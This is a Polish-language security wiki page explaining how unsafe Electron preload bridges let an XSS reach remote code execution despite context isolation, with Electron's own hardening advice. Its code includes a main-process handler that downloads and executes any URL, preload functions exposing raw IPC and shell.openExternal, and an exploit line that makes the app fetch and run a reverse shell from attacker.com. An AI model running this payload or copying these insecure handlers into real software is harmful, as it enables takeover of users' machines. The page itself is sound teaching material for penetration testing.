# RCE w Electron contextIsolation przez IPC

{{#include ../../banners/hacktricks-training.md}}

Izolacja kontekstu nie sprawia, że niebezpieczny mostek preload staje się bezpieczny. Jeśli preload udostępnia rendererowi uprzywilejowane IPC, XSS lub przejęty renderer może wywołać ten mostek; RCE zależy wtedy od walidacji i uprawnień odpowiedniego handlera w procesie głównym. Electron zaleca udostępnianie jednej wąskiej metody na operację, weryfikowanie nadawców IPC i nigdy nieudostępnianie surowych prymitywów IPC.<sup>[[3]](#references)[[4]](#references)</sup>

**Większość tych przykładów pochodzi stąd** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). Obejrzyj film, aby uzyskać więcej informacji.<sup>[[1]](#references)</sup>

## Przykład 0

Przykład z [https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21) (na tych slajdach znajdziesz pełny przykład wykorzystania XSS do uzyskania RCE w MS Teams; to tylko bardzo podstawowy przykład):<sup>[[2]](#references)</sup>

<figure><img src="../../images/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Przykład 1

Sprawdź, jak `main.js` nasłuchuje na `getUpdate` i **pobiera oraz wykonuje dowolny URL**.\
Sprawdź też, jak `preload.js` **udostępnia dowolne zdarzenie IPC** z procesu głównego.

```javascript
// Part of code of main.js
ipcMain.on("getUpdate", (event, url) => {
  console.log("getUpdate: " + url)
  mainWindow.webContents.downloadURL(url)
  mainWindow.download_url = url
})

mainWindow.webContents.session.on(
  "will-download",
  (event, item, webContents) => {
    console.log("downloads path=" + app.getPath("downloads"))
    console.log("mainWindow.download_url=" + mainWindow.download_url)
    url_parts = mainWindow.download_url.split("/")
    filename = url_parts[url_parts.length - 1]
    mainWindow.downloadPath = app.getPath("downloads") + "/" + filename
    console.log("downloadPath=" + mainWindow.downloadPath)
    // Set the save path, making Electron not to prompt a save dialog.
    item.setSavePath(mainWindow.downloadPath)

    item.on("updated", (event, state) => {
      if (state === "interrupted") {
        console.log("Download is interrupted but can be resumed")
      } else if (state === "progressing") {
        if (item.isPaused()) console.log("Download is paused")
        else console.log(`Received bytes: ${item.getReceivedBytes()}`)
      }
    })

    item.once("done", (event, state) => {
      if (state === "completed") {
        console.log("Download successful, running update")
        fs.chmodSync(mainWindow.downloadPath, 0755)
        var child = require("child_process").execFile
        child(mainWindow.downloadPath, function (err, data) {
          if (err) {
            console.error(err)
            return
          }
          console.log(data.toString())
        })
      } else console.log(`Download failed: ${state}`)
    })
  }
)
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```

Exploit:

```html
<script>
  electronSend("getUpdate", "https://attacker.com/path/to/revshell.sh")
</script>
```

## Przykład 2

Jeśli preload udostępnia `shell.openExternal` bez walidacji schematu i miejsca docelowego, dane wejściowe kontrolowane przez renderer mogą uruchamiać zarejestrowane zewnętrzne programy obsługi. To, czy doprowadzi to do wykonania kodu, zależy od platformy, zainstalowanych programów obsługi, schematu i wersji Electron; ogranicz tę funkcję do jawnej listy dozwolonych, oczekiwanych adresów `https:`.<sup>[[3]](#references)</sup>

```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
  shell.openExternal(url)
}
```

## Przykład 3

Jeśli preload udostępnia nieograniczoną komunikację z procesem głównym, XSS może wysyłać dowolne nazwy kanałów i dane. Skutki zależą od zarejestrowanych procedur obsługi IPC i ich kontroli autoryzacji.

```javascript
window.electronListen = (event, cb) => {
  ipcRenderer.on(event, cb)
}

window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```


## References

- [1] [Warsztaty: hacking nowoczesnych aplikacji desktopowych z użyciem XSS i RCE](https://www.youtube.com/watch?v=xILfQGkLXQo)
- [2] [Jak zhakowałem Microsoft Teams i zdobyłem 150 000 $ w Pwn2Own](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)
- [3] [Electron — lista kontrolna bezpieczeństwa](https://www.electronjs.org/docs/latest/tutorial/security)
- [4] [Electron — izolacja kontekstu i bezpieczne udostępnianie API](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
{{#include ../../banners/hacktricks-training.md}}
